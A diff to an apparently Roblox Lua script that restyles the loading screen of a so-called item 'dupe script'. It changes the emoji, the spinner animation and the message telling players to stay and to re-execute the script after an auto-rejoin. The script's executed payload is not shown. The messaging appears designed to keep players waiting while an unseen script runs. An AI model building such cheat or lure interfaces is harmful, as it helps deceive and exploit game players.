@@ -32,9 +32,9 @@ dupeInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
 dupeInfo.TextScaled = true
 dupeInfo.TextWrapped = true
 dupeInfo.ZIndex = 4
-dupeInfo.Text = "⏳🛠️ PLEASE WAIT WE ARE CURRENTLY EXECUTING THE DUPE SCRIPT. THIS MAY TAKE A MOMENT. DON'T LEAVE."
+dupeInfo.Text = "🛠️ PLEASE WAIT WE ARE CURRENTLY EXECUTING THE DUPE SCRIPT. THIS MAY TAKE A MOMENT. DON'T LEAVE."
 
--- Spinner Emoji Label (⏳🔁)
+-- Spinner Emoji Label (🔁 only)
 local emojiSpinner = Instance.new("TextLabel", frame)
 emojiSpinner.Size = UDim2.new(0.15, 0, 0.15, 0)
 emojiSpinner.Position = UDim2.new(0.5, 0, 0.48, 0)
@@ -44,17 +44,16 @@ emojiSpinner.Font = Enum.Font.GothamBold
 emojiSpinner.TextScaled = true
 emojiSpinner.TextColor3 = Color3.new(1, 1, 1)
 emojiSpinner.ZIndex = 4
-emojiSpinner.Text = "⏳"
+emojiSpinner.Text = "🔁"
 
--- Animate Spinner + Run Script on First Spin
+-- Animate Spinner + Run Script Once
 task.spawn(function()
-	local icons = {"⏳", "🔁"}
-	local index = 1
+	local index = 0
 	local firstRun = true
 
 	while emojiSpinner and emojiSpinner.Parent do
-		emojiSpinner.Text = icons[index]
-		index = index % #icons + 1
+		emojiSpinner.Rotation = index % 360
+		index += 30
 
 		if firstRun then
 			firstRun = false
@@ -63,11 +62,11 @@ task.spawn(function()
 			end)
 		end
 
-		wait(0.4)
+		wait(0.05)
 	end
 end)
 
--- Wait Message Below Spinner
+-- Updated Bottom Message
 local waitMsg = Instance.new("TextLabel", frame)
 waitMsg.Size = UDim2.new(0.95, 0, 0.12, 0)
 waitMsg.Position = UDim2.new(0.5, 0, 0.7, 0)
@@ -77,7 +76,7 @@ waitMsg.Font = Enum.Font.GothamBold
 waitMsg.TextScaled = true
 waitMsg.TextColor3 = Color3.new(1, 1, 1)
 waitMsg.ZIndex = 4
-waitMsg.Text = "⏳ DONT LEAVE WAIT 4-5 MINS TO WORK THE SCRIPT"
+waitMsg.Text = "⚠️ IF YOU GOT AUTO REJOIN ITS NORMAL EXECUTE THE SCRIPT AGAIN"
 
 -- Footer Credit
 local credit = Instance.new("TextLabel", frame)
